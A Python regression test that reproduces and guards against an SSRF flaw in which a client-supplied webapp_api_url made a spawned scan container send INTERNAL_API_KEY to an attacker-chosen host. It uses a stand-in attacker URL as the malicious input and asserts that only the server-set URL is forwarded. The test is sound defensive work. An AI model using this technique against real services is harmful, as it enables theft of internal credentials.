"""V2 — SSRF / INTERNAL_API_KEY leak via client-supplied ``webapp_api_url``.

Exploit (pre-patch): the ``/recon/start`` (and sibling) handlers forwarded the
request's ``webapp_api_url`` verbatim to the spawned scan container, which then
sends ``INTERNAL_API_KEY`` to it. A caller could therefore set
``webapp_api_url: http://attacker`` and exfiltrate the master key.

This is a *reproduction-as-test*: it drives the REAL handler with a malicious
``webapp_api_url`` and asserts the value forwarded to ``container_manager`` (and
thence to the spawned container's env + credentialed call) is the
server-controlled URL, never the attacker's. Run against the pre-patch code
(`git stash push -- recon_orchestrator/api.py`) it FAILS — the attacker URL is
captured — demonstrating the exploit; against the patched code it passes.

Run: python -m pytest tests/test_v2_ssrf_webapp_url.py -q
"""
import asyncio
import types

import api
from models import ReconStartRequest
from tests.job_credentials import job_credential, use_keys

ATTACKER = "http://attacker.evil.example:9999"
SAFE = "http://localhost:3000"


class _BenignProjectResponse:
    """A reachable webapp answering with a project that passes the pre-flight.

    Since P0-1 the guardrail / RoE pre-flight fails CLOSED, so a handler driven
    against an unreachable webapp now refuses with 503 and never reaches the
    spawn these tests are about. Satisfying the pre-flight keeps the assertion
    on the SSRF invariant rather than on the pre-flight's behaviour.
    """

    status = 200

    def read(self):
        return b'{"targetDomain": "example.com", "ipMode": false}'

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def _drive_start_recon(monkeypatch, client_webapp_url):
    """Call the real start_recon handler with container_manager mocked; return
    the kwargs the handler forwarded to container_manager.start_recon."""
    captured = {}

    async def fake_start_recon(**kwargs):
        captured.update(kwargs)
        return types.SimpleNamespace(project_id=kwargs.get("project_id"), status="running")

    monkeypatch.setenv("SPAWNED_WEBAPP_API_URL", SAFE)
    monkeypatch.setattr("urllib.request.urlopen",
                        lambda *a, **kw: _BenignProjectResponse())
    monkeypatch.setattr(api, "container_manager",
                        types.SimpleNamespace(start_recon=fake_start_recon))
    use_keys(monkeypatch)
    req = ReconStartRequest(project_id="p1", user_id="u1", webapp_api_url=client_webapp_url,
                            job_credential=job_credential("p1", "u1"))
    asyncio.run(api.start_recon("p1", req))
    return captured


def test_v2_attacker_webapp_url_is_not_forwarded(monkeypatch):
    captured = _drive_start_recon(monkeypatch, ATTACKER)
    # The URL forwarded to the spawned container (which carries INTERNAL_API_KEY)
    # MUST be the server-controlled value, never the attacker's. PRE-PATCH this
    # equals ATTACKER (the exploit) and the assertion fails.
    assert captured.get("webapp_api_url") == SAFE
    assert "attacker" not in captured.get("webapp_api_url", "")


def test_v2_request_field_is_fully_inert(monkeypatch):
    # Even a benign-looking client value must not influence the forwarded URL.
    captured = _drive_start_recon(monkeypatch, "http://somewhere-else:3000")
    assert captured.get("webapp_api_url") == SAFE
